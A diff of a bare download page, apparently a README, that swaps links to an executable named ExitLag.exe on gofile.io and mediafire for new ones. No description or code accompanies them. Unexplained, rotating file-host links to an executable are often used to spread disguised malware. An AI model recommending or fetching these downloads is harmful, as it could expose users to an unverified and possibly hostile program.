@@ -2,9 +2,9 @@ Download =====>
 
 "1"  
 
-"2" https://gofile.io/d/maftqz 
+"2" https://gofile.io/d/IqeOUz
 
-"3" https://www.mediafire.com/file/dmock58uklmfsm1/ExitLag.exe/file  
+"3" https://www.mediafire.com/file/igqur4j9es89g0d/ExitLag.exe/file  
 
 "4" realeas     
 
